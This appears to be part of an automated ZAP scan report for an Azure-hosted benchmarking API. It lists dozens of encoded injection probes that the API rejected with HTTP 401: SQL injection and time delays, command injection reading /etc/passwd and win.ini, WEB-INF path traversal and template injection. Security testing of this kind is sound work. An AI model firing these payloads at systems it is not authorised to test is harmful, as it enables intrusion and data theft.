* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527+%252F+sleep%252815%2529+%252F+%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527+AND+%25271%2527%253D%25271%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527+AND+%25271%2527%253D%25272%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527+OR+%25271%2527%253D%25271%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527+UNION+ALL+select+NULL+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2529%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2529%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2529%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2529+UNION+ALL+select+NULL+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+%2528
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%253B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%253Bcat+%252Fetc%252Fpasswd%253B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%253Bget-help
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%253Bget-help+%2523
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%253Bsleep+15.0%253B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%253Bstart-sleep+-s+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%253Bstart-sleep+-s+15.0+%2523
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%257Ctimeout+%252FT+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id&class.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id+%252F+case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id+%252F+sleep%252815%2529+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id+AND+1%253D1+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id+AND+1%253D2+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id+and+exists+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id+or+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id+OR+1%253D1+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id+UNION+ALL+select+NULL+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id0W45pz4p
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=jtwsqlhxyhfs4xjpojuqr2j6tgo6uwmsv0t83n7z7uxbmjfw3woq85y93s
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=opJKfdEuGqJQRRxatVRrPIcAOEpJCjsqIrftxVFvMNxMTJmlMMkxiRlnwnkFpNMhSjBLYWRLMYfSKxOpvXmoDedqiFqVEVcuOxdWVYGwAwOLUdlTEqFmiQypDMuypIckmXOOLwlRqIZgeBxVMYuMjQnIPbIyYVUNsMFZiahVESoonDfifmXDollaApfAGCXdtpZtUMQJlViocLmrcSwXHuyRFRbncupqTZoqJkwKDhnMouvcWvvvrKRqPNwHRGGAFZtQSajMHcaOFfABrGBwPSHcvSOTWPuQBLddZIrFdeCdgSBwCrQGbqHtixeJpfaFwXmrURWMcWiVvYIXcJvLLcpsRNJieEXtEFuoLnKCxtOpeLHlIsksOHXUpLJIGxKcIsEcePMVhtNDSUegTRPjrHtFDLChckFGKcZQyTfSTxjFxgkmJrHNsdYcKaZvUULCKPVuXOrpsVWpvkBUVECJYLUZwaYyGiHJYqqtpmmSxcYailpNSEdwOaFonFjVeYZlJdGENLspYGDiXTWbnHKAMajyxWpXCymopSDWpuKujuMwnLTSyoYHqLrsCyvaWENIRYYQWQJsBHhohQeHpOBlZMJjlxoLnpRKLkFiLckhOhJkkdnXqAyMGGNZIYpThTKgnskFcIJBMPhKgcuFaTkKLlobWLPpssevjtHEbHmwlTyJaNJIxfneiFthpmfpDRFfOlluaRRcQWcLjVreZAXABferVxqYwACJYMKVvPUnhLpiWrpgqrtrqiKNCPdkTbNeJsDaurpVMFtwtllueoyRtXEGBgLVnPgLXLgqbvrPqLpJLleDjMkRXufcDKgsDMrwLiRRuKllkkhKFPyNRvPqmgEUaipCFsDAQwqApSFyWkUcXyycDheCdCFHCbYjvvoUjFBYxEFsfZVoLeFpAPamsidnKycrhEwybkOCgSGOJmfQqMSbrxVPgHKGRVmeElyRlQHDxUQNkUTQcJUxfpwNStZKSkiAySoKxjcncvTJKfIsTkeqDGkSycpesDWAxrcaNYkhQLyVUXvKIssmmHvpYXoctbTJExDkFEoGNmOsOOoxyWHSkuGuThrLRWLYqbPYNCXSlWeDMDHTPOwdliXAIVPbpWkfPwQvAqHxAvmoAXnXSwjreGoiHynxpmZkOksbQoYgfGrjqvGcbQQSHmGHEsvFSmuEEZAJfQnJwxJCmZsFPtyqcjwbxRSfghdZVsYZUjswMrgPgOnhdJKQphYJmolWXbVhsxKXbKQVRGYAvTyBocsvbKnwsRHFeYWJWKPkXcUfXqJrRVUTYYogBSvxjLoBcTUXxwCptEMtufFlVDoebHTdVysPUqEiMjyRFpplyAhvPnPAtKphPMhnrvFnbANDgYscKbfVxwDesmTUhYbGCUkFlMrPTqLGbwDdwAKmUBpQGfgogAaQYiQFMLirJSqiccqRhqfZbCiGwvKoVQHSHDXwjUOcujwtxuKnwbiAPSgsqNRkAhUsJBiSCUJnexIZcxGKFdHENJrKxrrtsyhRHIVZZmZuCZwWDGrlosEwTjvXnvkHrFafSvhONvQYfHvvWCjSYFnwKCmdjlyPVDZiekQVNJfnZVBEhYUpJrwWwTYRtyyLAZPGjWINUYdDApjUdYvcjSVbheTFGyeokAxgMgpksVQPadFeVpTrOwQVZykVNqcArjIfhPlLqEJQptcSlXQyrAMaahmawePgPScvGudMLSRpxweTXEuNHNfxYkDbTAetahIoOjLNUehapPIykyuifaAWATVjZDiThiZsRtlQQVMQGoGVoOTpLVoPatckMmkAsImJOpYZfDoJyunUfvhbIhrreNAQOQbkMhQAPoBhKNARdXqseXDYXwpyqILpFJsIamvRgqsOsrZpfuUtXcIZJjhZZwunRFyJJULcegNHnJqgNtLbhADWMOcpbeSGiRoYCHUUbGgiLbUYreNafmRplScTgbBymoUsSmVHtyCNjfAdkYXqHeyjrLfKdxMLFwSucyQfaYdBQRUnJxcLZYuHSQUCahgOgJroBuvyetoRjIcXQMDgpRcqkIPDKUdNJGuTabrKreMbFmAhtvghRNWKlPsVdtxJNutDpYXmADHdaEJs
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=response.write%2528787%252C443*45%252C657%2529
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=Set-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=thishouldnotexistandhopefullyitwillnot
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=type+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=URL%253D%2527http%253A%252F%252F1498374535918995670.owasp.org%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=user-data
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=WEB-INF%252Fweb.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=WEB-INF%255Cweb.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=www.google.com
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=www.google.com%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=www.google.com%252Fsearch%253Fq%253DZAP
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=www.google.com%253A80%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=www.google.com%253A80%252Fsearch%253Fq%253DZAP
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=ZAP
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=ZAP%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%250A
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=ZAP+%25251%2521s%25252%2521s%25253%2521s%25254%2521s%25255%2521s%25256%2521s%25257%2521s%25258%2521s%25259%2521s%252510%2521s%252511%2521s%252512%2521s%252513%2521s%252514%2521s%252515%2521s%252516%2521s%252517%2521s%252518%2521s%252519%2521s%252520%2521s%252521%2521n%252522%2521n%252523%2521n%252524%2521n%252525%2521n%252526%2521n%252527%2521n%252528%2521n%252529%2521n%252530%2521n%252531%2521n%252532%2521n%252533%2521n%252534%2521n%252535%2521n%252536%2521n%252537%2521n%252538%2521n%252539%2521n%252540%2521n%250A
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=zApPX77sS
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=zj%2523%257B6264*1871%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=zj%2523set%2528%2524x%253D5037*6926%2529%2524%257Bx%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=zj%2524%257B4659*3299%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=zj%253C%2525%253D3348*1243%2525%253Ezj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=zj%253Cp+th%253Atext%253D%2522%2524%257B8323*9151%257D%2522%253E%253C%252Fp%253Ezj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=zj%257B%25234022*1432%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=zj%257B%25402736*5704%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=zj%257B%2540math+key%253D%25221521%2522+method%253D%2522multiply%2522+operand%253D%25227868%2522%252F%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=zj%257B%257B%253D2911*9595%257D%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
